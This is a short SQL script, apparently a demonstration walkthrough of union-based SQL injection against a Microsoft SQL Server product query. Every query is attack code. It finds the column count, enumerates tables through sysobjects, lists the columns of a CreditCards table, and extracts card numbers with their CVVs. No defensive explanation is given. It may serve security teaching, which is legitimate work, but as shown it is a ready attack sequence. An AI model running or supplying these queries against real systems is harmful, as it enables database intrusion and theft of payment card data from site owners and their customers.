-- try union, and retry until you get results

SELECT * FROM Products WHERE IsAvailable = 1 AND Id = 1 union select '1'
SELECT * FROM Products WHERE IsAvailable = 1 AND Id = 1 union select '1', '1'
SELECT * FROM Products WHERE IsAvailable = 1 AND Id = 1 union select '1', '1', '1'
SELECT * FROM Products WHERE IsAvailable = 1 AND Id = 1 union select '1', '1', '1', '1'

-- choose a text column - second in this case

-- get all tables in database
SELECT * FROM Products WHERE IsAvailable = 1 AND Id = 1 
union 
select '1', exploit.name, '3','4'
from
(
	select * from sysobjects where xtype=char(85)
) exploit

-- target CreditCards table 

-- extract columns from CreditCards table 
SELECT * FROM Products WHERE IsAvailable = 1 AND Id = 1 
union 
select '1', exploit.name, '3','4'
from
(
	SELECT COLUMN_NAME as name
	FROM INFORMATION_SCHEMA.COLUMNS
	WHERE TABLE_NAME = N'CreditCards'
) exploit

-- extract credit card numbers and cvvs
SELECT * FROM Products WHERE IsAvailable = 1 AND Id = 1 
union 
select '1', exploit.val, '3','4'
from
(
	SELECT concat('card number:', number,',   cvv:',cvv) as val
	FROM CreditCards
) exploit